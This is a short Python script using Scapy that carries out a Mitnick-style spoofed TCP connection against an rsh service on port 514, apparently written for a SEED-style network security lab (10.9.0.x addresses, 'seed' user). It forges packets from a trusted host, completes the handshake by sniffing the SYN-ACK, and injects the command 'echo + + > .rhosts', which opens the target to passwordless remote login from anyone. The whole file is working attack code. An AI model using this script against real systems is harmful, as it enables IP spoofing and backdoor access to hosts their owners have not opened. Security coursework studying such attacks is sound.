#!/bin/env python3

from scapy.all import *
#from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits


def syn_ack(response_pkt):
	if(response_pkt[TCP].flags == "SA"):
		new_ip = IP(dst=response_pkt[IP].src)
		new_tcp = TCP(dport=response_pkt[TCP].sport, flags='A', seq=response_pkt[TCP].ack, ack=(response_pkt[TCP].seq+1))
		new_pkt = new_ip/new_tcp
		new_pkt[IP].src=response_pkt[IP].dst
		new_pkt[TCP].sport =response_pkt[TCP].dport
		
		send(new_pkt, verbose = 0)
		
		#data= '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
		data= '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
		rsh_ip = IP(dst=response_pkt[IP].src)
		rsh_tcp = TCP(dport=response_pkt[TCP].sport, flags='A', seq=response_pkt[TCP].ack, ack=(response_pkt[TCP].seq+1))
		rsh_pkt = rsh_ip/rsh_tcp
		rsh_pkt[IP].src=response_pkt[IP].dst
		rsh_pkt[TCP].sport =response_pkt[TCP].dport
		send(rsh_pkt/data, verbose = 0)

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=514, flags='S')
pkt = ip/tcp

pkt[IP].src ="10.9.0.6" 
pkt[TCP].sport =1023
pkt[TCP].seq = getrandbits(32)


send(pkt, verbose = 0)


response_pkt = sniff(iface='br-444c28130ffb', filter='src host 10.9.0.5 and tcp and dst port 1023', prn=syn_ack)
